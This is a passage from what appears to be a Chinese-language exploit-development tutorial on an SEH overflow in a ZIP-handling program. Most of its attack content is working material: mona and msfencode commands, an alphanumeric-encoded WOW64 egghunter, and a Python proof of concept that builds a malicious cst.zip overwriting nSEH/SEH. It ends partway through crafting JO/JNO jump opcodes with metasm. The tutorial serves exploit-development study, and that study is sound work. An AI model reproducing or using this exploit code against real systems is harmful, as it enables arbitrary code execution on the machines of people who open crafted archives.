真棒，我们已经进入有效载荷…但有一个问题：因为NULL字节的缘故，SEH链之后的所有东西都被切断了，所以没有给我们太多的空间做任何事情。
**shellcode去哪里了？**
好的，我们分析一下，看看我们进展情况。
我们设法让它崩溃了，并且能控制SEH，这非常好！ 问题是我们的有效载荷受制于一个非常有限的字符集，并且因为我们必须使用NULL字节的地址来调用POP-POP-RET指令，我们的有效载荷被切断了，并且留给shellcode的空间也不是很大。
那么它究竟有多大呢？ 别忘了，为了获得SEH，我们还在有效负载开始部分进行了填充：
那么我们有多少空间呢？ 共计292个字节。 不幸的是，这些是不够的。
不过，这个问题好像可以用egghunter来解决！
Egghunter只是一堆指令，在程序的内存空间中查找一个特定的、已知的字节序列（“egg”），一旦找到，将重定向到该区域。
这样我们就不用担心我们的shellcode在哪里结束了，我们可以调用eghtunter例程，它会为我们找到它们！
听起来不错，但下一个问题是，有效载荷的“截止”部分真的位于在内存中吗？ 我们来看看吧。
让我们生成3764个单字符的模版（在NULL字节之后填写我们的有效负载），并用它替换现有的A。
    ！mona pc 3764
我们触发崩溃，当我们得到我们的第一个异常时，不要将异常传递给程序，而是调用以下命令来在内存中搜索以前生成的模版：
    ！mona findmsp
太棒了！ 有效载荷的整个“截断”部分仍然在内存中，所以我们应该能够成功地使用egghunter来获取我们的shellcode。
**Egghunter**
现在我们能够使用egghunter来获取我们的shellcode，但是我们只有292个字节可供使用。实际上，我们可以用292字节空间做许多事情，但是别忘了，我们只能使用非常有限的字符集。
我们试着用metasploit的x86 / alpha_mixed编码器对egghunter进行编码，看看在这之后还剩下多少空间。
首先，让我们生成egghunter有效载荷。
请记住，我们正在使用64位操作系统，因此还需要使用相应的egghunter例程（有关更多详细信息，请访问
）：
    ！mona egghunter -wow64
将生成的字节复制到文本文件中，并使用xxd将其转换为二进制文件：
    # cat egghunter-wow64.txt 
    31db53535353b3c06681caff0f42526a265833c98bd464ff135e5a3c0574e9b8773030748bfaaf75e4af75e1ffe7
    # cat egghunter-wow64.txt | xxd -r -p > egghunter-wow64.bin
现在，我们需要让编码器确保只用ASCII可打印字符。
    # msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
    [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
    buf = 
    "x50x59x49x49x49x49x49x49x49x49x49x49x49x49" +
    "x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30" +
    "x41x6bx41x41x51x32x41x42x32x42x42x30x42x42" +
    "x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b" +
    "x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36" +
    "x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a" +
    "x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74" +
    "x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44" +
    "x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b" +
    "x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51" +
    "x6bx4fx79x77x41x41"
注意：我已经使用bufferedregister = eax选项，这是因为编码器需要找到它在内存中的位置，以便能够对有效载荷进行解码。
最初，负责该项工作的例程不在ASCII可打印的字符集中，因此会破坏我们的有效载荷。
指定bufferregister选项基本上就是告诉编码器不用担心如何在内存中找到自己的位置，我们会事先做好这件事情，我们将其地址放在EAX寄存器中。
这样，我们的编码后的egghunter就是纯ASCII字符（更多关于生成字母数字shellcode的信息可以在这里找到）。
我们更新我们的PoC漏洞利用代码，以反映我们迄今为止所做的工作的成效。
    #!/usr/bin/python
    header_1 = ("x50x4Bx03x04x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00xe4x0fx00x00x00")
    header_2 = ("x50x4Bx01x02x14x00x14x00x00x00x00x00xB7xACxCEx34x00x00x00"
    "x00x00x00x00x00x00x00x00x00xe4x0fx00x00x00x00x00x00x01x00"
    "x24x00x00x00x00x00x00x00")
    header_3 = ("x50x4Bx05x06x00x00x00x00x01x00x01x00"
    "x12x10x00x00x02x10x00x00x00x00")
    print "[+] Building PoC.."
    max_size = 4064
    nseh_offset = 292
    # msfencode -e x86/alpha_mixed bufferregister=eax -i egghunter-wow64.bin
    # [*] x86/alpha_mixed succeeded with size 146 (iteration=1)
    egghunter = ("x50x59x49x49x49x49x49x49x49x49x49x49x49x49"
    "x49x49x49x49x37x51x5ax6ax41x58x50x30x41x30"
    "x41x6bx41x41x51x32x41x42x32x42x42x30x42x42"
    "x41x42x58x50x38x41x42x75x4ax49x66x51x49x4b"
    "x52x73x53x63x62x73x36x33x4ex53x6fx30x75x36"
    "x6dx51x59x5ax49x6fx36x6fx72x62x71x42x42x4a"
    "x66x46x56x38x74x73x78x49x4cx4bx4bx64x61x74"
    "x49x6fx47x63x31x4ex50x5ax77x4cx77x75x53x44"
    "x49x79x38x38x52x57x36x50x50x30x33x44x6cx4b"
    "x59x6ax4ex4fx32x55x38x64x4ex4fx70x75x6bx51"
    "x6bx4fx79x77x41x41")
    payload = egghunter
    payload += "A" * (nseh_offset - len(payload))   # padding for nSEH
    payload += "BBBB"                               # nSEH
    payload += "x33x28x42x00"                   # SEH
    payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev"
    payload += ".txt"
    print "[+] Length = " + str(len(payload))
    exploit = header_1 + payload + header_2 + payload + header_3
    mefile = open('cst.zip','w');
    mefile.write(exploit);
    mefile.close()
    print "[+] Exploit complete!"
让我们触发崩溃，将控制权传递给该程序并执行POP-POP-RET指令。 之后，在CPU窗口中向上滚动，寻找egghunter有效载荷和一组EC
ECX指令（代表字符A）的结束位置。
好的，看起来像是在那里，它似乎也是正确的:没有使用不符合要求的字符！
**跳转回来**
现在我们还有更多的事情需要考虑——这里最重要的一点是，我们需要把egghunter的地址放在EAX中，然后跳转到那里。
我们如何在空间有限的情况下做到这一点？ 首先，我们有多少空间？ 简单计算一下就知道是146字节（nseh偏移减去egghunter的大小）。
146字节可以做什么？ 我们只需要写几个指令，但是它们必须属于允许使用的有限的字符集。
在这种情况下，我们不能使用已经用于egghunter的通用编码器，因为我们根本没有足够的空间来满足它。
所以，我们需要创建自己的编码器！ 这听起来很让人头疼，但实际上比看起来要简单得多。
首先，我们来看看目前在程序中的位置。
我们只有4个字节，可由我们支配用来跳回有效载荷并开始写定制的编码器。同时，这4个字节最好是字母数字。 幸运的是，有多个指令可供使用，特别是在那些情况下！
在这方面，可以参考TheColonial分享的相关技巧：http://buffered.io/posts/jumping-with-bad-chars/。
简而言之，我们可以简单地使用JO和JNO指令来调用近转移指令到我们的有效载荷。 但我们能跳多远？
通过用一些允许的字符的包裹后，我发现一些坏的字符会被转换为A2，它转换成十进制就是92，这应该能给我们提供足够的空间，以创建我们的自定义编码器。
让我们用metasm生成所需的操作码，并将它们添加到我们的有效载荷中，用于代替nSEH。
    metasm > jno $-99
    "x71x9b"
    metasm > jo $-99